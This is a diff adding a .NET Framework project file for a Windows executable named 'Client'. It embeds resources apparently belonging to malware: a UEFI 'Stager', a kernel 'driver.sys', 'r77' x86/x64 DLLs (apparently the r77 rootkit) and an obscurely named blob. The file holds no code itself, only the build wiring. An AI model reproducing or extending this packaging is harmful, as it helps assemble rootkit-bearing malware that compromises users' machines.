@@ -1,0 +1,37 @@
+<Project Sdk="Microsoft.NET.Sdk.WindowsDesktop">
+  <PropertyGroup>
+    <AssemblyName>Client</AssemblyName>
+    <GenerateAssemblyInfo>False</GenerateAssemblyInfo>
+    <OutputType>WinExe</OutputType>
+    <UseWindowsForms>True</UseWindowsForms>
+    <TargetFramework>net48</TargetFramework>
+    <PlatformTarget>x64</PlatformTarget>
+  </PropertyGroup>
+  <PropertyGroup>
+    <LangVersion>14.0</LangVersion>
+    <AllowUnsafeBlocks>True</AllowUnsafeBlocks>
+    <CheckForOverflowUnderflow>False</CheckForOverflowUnderflow>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <RootNamespace />
+  </PropertyGroup>
+  <ItemGroup>
+    <None Remove="Client.Helper.Stager.efi" />
+    <None Remove="Client.Resources.driver.sys" />
+    <None Remove="Client.Resources.r77-x86.dll" />
+    <None Remove="Client.Resources.r77-x64.dll" />
+    <None Remove="hz24pph0a" />
+    <EmbeddedResource Include="Client.Helper.Stager.efi" LogicalName="Client.Helper.Stager.efi" />
+    <EmbeddedResource Include="Client.Resources.driver.sys" LogicalName="Client.Resources.driver.sys" />
+    <EmbeddedResource Include="Client.Resources.r77-x86.dll" LogicalName="Client.Resources.r77-x86.dll" />
+    <EmbeddedResource Include="Client.Resources.r77-x64.dll" LogicalName="Client.Resources.r77-x64.dll" />
+    <EmbeddedResource Include="hz24pph0a" LogicalName="hz24pph0a" />
+  </ItemGroup>
+  <ItemGroup>
+    <Reference Include="System.Management" />
+    <Reference Include="System.Core">
+      <HintPath>../../../../../../../opt/homebrew/Cellar/dotnet/10.0.105/libexec/shared/Microsoft.NETCore.App/10.0.5/System.Core.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+</Project>
